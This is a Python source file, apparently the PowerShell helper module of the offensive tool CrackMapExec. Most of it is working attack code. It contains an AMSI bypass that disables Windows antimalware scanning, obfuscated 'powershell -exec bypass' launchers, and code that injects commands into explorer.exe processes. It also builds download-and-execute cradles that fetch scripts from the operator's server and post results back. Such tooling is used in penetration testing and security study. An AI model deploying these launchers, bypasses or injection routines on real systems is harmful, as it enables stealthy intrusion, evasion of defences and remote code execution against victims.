import cme
import os
import logging
import re
import random
import tempfile
from sys import exit
from subprocess import check_output, call
from cme.helpers.misc import gen_random_string
from cme.logger import CMEAdapter
from base64 import b64encode

logger = CMEAdapter()

def get_ps_script(path):
    return os.path.join(os.path.dirname(cme.__file__), 'data', path)

def encode_ps_command(command):
    return b64encode(command.encode('UTF-16LE'))

def is_powershell_installed():
    return False
    """
    try:
        with open(os.devnull, 'w') as devnull:
            out = check_output(['powershell', '--help'], stderr=devnull)
    except OSError as e:
        if e.errno == os.errno.ENOENT:
            return False
    return True
    """

def obfs_ps_script(path_to_script):
    ps_script = path_to_script.split('/')[-1]
    obfs_script_dir = os.path.join(os.path.expanduser('~/.cme'), 'obfuscated_scripts')
    obfs_ps_script = os.path.join(obfs_script_dir, ps_script)

    if os.path.exists(obfs_ps_script):
        with open(obfs_ps_script, 'r') as script:
            return script.read()
    else:
        if is_powershell_installed():
            logger.info('Performing one-time script obfuscation, please wait this can take a bit...')

            invoke_obfs_command = 'powershell -C \'Import-Module {};Invoke-Obfuscation -ScriptPath {} -Command "TOKEN,ALL,1,OUT {}" -Quiet\''.format(get_ps_script('invoke-obfuscation/Invoke-Obfuscation.psd1'),
                                                                                                                                                     get_ps_script(path_to_script),
                                                                                                                                                     obfs_ps_script)
            #logging.debug(invoke_obfs_command)

            #invoke_obfs_command = b64encode(invoke_obfs_command.encode('UTF-16LE')) 

            #command = ['powershell', '-C', invoke_obfs_command]

            with open(os.devnull, 'w') as devnull:
                return_code = call(invoke_obfs_command, stdout=devnull, stderr=devnull, shell=True)

            logger.info('Script obfuscated successfully')

            with open(obfs_ps_script, 'r') as script:
                return script.read()

        else:
            with open(get_ps_script(path_to_script), 'r') as script:
                """
                Strip block comments, line comments, empty lines, verbose statements,
                and debug statements from a PowerShell source file.
                """

                # strip block comments
                strippedCode = re.sub(re.compile('<#.*?#>', re.DOTALL), '', script.read())
                # strip blank lines, lines starting with #, and verbose/debug statements
                strippedCode = "\n".join([line for line in strippedCode.split('\n') if ((line.strip() != '') and (not line.strip().startswith("#")) and (not line.strip().lower().startswith("write-verbose ")) and (not line.strip().lower().startswith("write-debug ")) )])

                with open(obfs_ps_script, 'w') as script2:
                    script2.write(strippedCode)

                return strippedCode
'''
def create_ps_command(ps_command, force_ps32=False):

    temp = tempfile.NamedTemporaryFile(prefix='cme_',
                                       suffix='.ps1',
                                       dir='/tmp')

    ps_command = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
try{{
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
}}catch{{}}
{}
""".format(ps_command)

    logging.debug('Unincoded command:\n' + ps_command)

    if force_ps32:
        command = """$command = '{b64_command}'
if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')
{{

    $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\{ps_invoker}' + $command + '"'
    IEX $exec
}}
else
{{
    $exec = [System.Convert]::FromBase64String($command)
    $exec = [Text.Encoding]::Unicode.GetString($exec)
    IEX $exec

}}""".format(b64_command=b64encode(ps_command.encode('UTF-16LE')),
             ps_invoker=random.choice(obfs_ps_invokers))

        temp.write(command)

    else:
        temp.write(ps_command)

    temp.read()

    encoding_types = [1,2,3,4,5,6]
    while True:
        encoding = random.choice(encoding_types)

        invoke_obfs_command = 'powershell -C \'Import-Module {};Invoke-Obfuscation -ScriptPath {} -Command "ENCODING,{}" -Quiet\''.format(get_ps_script('invoke-obfuscation/Invoke-Obfuscation.psd1'),
                                                                                                                                          temp.name,
                                                                                                                                          encoding)

        logging.debug(invoke_obfs_command)
        #out = b64encode(check_output(invoke_obfs_command, shell=True).split('\n')[4].strip().encode('UTF-16LE'))
        #command = random.choice(obfs_ps_invokers) + out + '"'
        out = check_output(invoke_obfs_command, shell=True).split('\n')[4].strip()
        command = 'powershell.exe -exec bypass -noni -nop -w 1 -C "{}"'.format(out)

        logging.debug('Command length: {}'.format(len(command)))

        if len(command) <= 8192: break

        encoding_types.remove(encoding)

    temp.close()
    return command
'''

def create_ps_command(ps_command, force_ps32=False):

    #Stolen from Unicorn https://github.com/trustedsec/unicorn/
    obfs_ps_invokers = [
    'powershell.exe -exec bypass -noni -nop -w 1 -C "powershell ([char]45+[char]101+[char]99) ',
    'powershell.exe -exec bypass -noni -nop -w 1 -C "sv {ran1} -;sv {ran2} ec;sv {ran3} ((gv {ran1}).value.toString()+(gv {ran2}).value.toString());powershell (gv {ran3}).value.toString() '.format(ran1=gen_random_string(2), 
                                                                                                                                                                                                     ran2=gen_random_string(2), 
                                                                                                                                                                                                     ran3=gen_random_string(2))
    ]

    amsi_bypass = """
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
try{
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
}catch{}
"""
    if force_ps32:
        command = amsi_bypass + """
$functions = {{
    function Command-ToExecute
    {{
{command}
    }}
}}
if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')
{{
    $job = Start-Job -InitializationScript $functions -ScriptBlock {{Command-ToExecute}} -RunAs32
    $job | Wait-Job
}}
else
{{
    IEX "$functions"
    Command-ToExecute
}}
""".format(command=amsi_bypass + ps_command,
           ps_invoker=obfs_ps_invokers[0])

    else:
        command = amsi_bypass + ps_command

    logging.debug('Generated PS command:\n {}\n'.format(command))

    command = random.choice(obfs_ps_invokers) + encode_ps_command(command) + '"'

    if len(command) > 8191: 
        logger.error('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))
        exit(1)

    return command

def gen_ps_inject(command, context=None, procname='explorer.exe', inject_once=False):
    #The following code gives us some control over where and how Invoke-PSInject does its thang
    #It prioritizes injecting into a process of the active console session
    ps_code = '''
$injected = $False
$inject_once = {inject_once}
$command = "{command}"
$owners = @{{}}
$console_login = gwmi win32_computersystem | select -exp Username
gwmi win32_process | where {{$_.Name.ToLower() -eq '{procname}'.ToLower()}} | % {{
    if ($_.getowner().domain -and $_.getowner().user){{
    $owners[$_.getowner().domain + "\\" + $_.getowner().user] = $_.handle
    }}
}}
try {{
    if ($owners.ContainsKey($console_login)){{
        Invoke-PSInject -ProcId $owners.Get_Item($console_login) -PoshCode $command
        $injected = $True
        $owners.Remove($console_login)
    }}
}}
catch {{}}
if (($injected -eq $False) -or ($inject_once -eq $False)){{
    foreach ($owner in $owners.Values) {{
        try {{
            Invoke-PSInject -ProcId $owner -PoshCode $command
        }}
        catch {{}}
    }}
}}
'''.format(inject_once='$True' if inject_once else '$False', 
           command=encode_ps_command(command), procname=procname)

    if context:
        return gen_ps_iex_cradle(context, 'Invoke-PSInject.ps1', ps_code, post_back=False)

    return ps_code

def gen_ps_iex_cradle(context, scripts, command=str(), post_back=True):

    if type(scripts) is str:

        launcher = """
[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{ps_script_name}')
{command}
""".format(server=context.server,
           port=context.server_port,
           addr=context.localip,
           ps_script_name=scripts,
           command=command if post_back is False else '').strip()

    elif type(scripts) is list:
        launcher = '[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n'
        for script in scripts:
            launcher += "IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{script}')\n".format(server=context.server,
                                                                                                                      port=context.server_port,
                                                                                                                      addr=context.localip,
                                                                                                                      script=script)
        launcher.strip()
        launcher += command if post_back is False else ''

    if post_back is True:
        launcher += '''
$cmd = {command}
$request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/')
$request.Method = 'POST'
$request.ContentType = 'application/x-www-form-urlencoded'
$bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)
$request.ContentLength = $bytes.Length
$requestStream = $request.GetRequestStream()
$requestStream.Write($bytes, 0, $bytes.Length)
$requestStream.Close()
$request.GetResponse()'''.format(server=context.server,
                                  port=context.server_port,
                                  addr=context.localip,
                                  command=command)
                                  #second_cmd= second_cmd if second_cmd else '')

    logging.debug('Generated PS IEX Launcher:\n {}\n'.format(launcher))

    return launcher.strip()
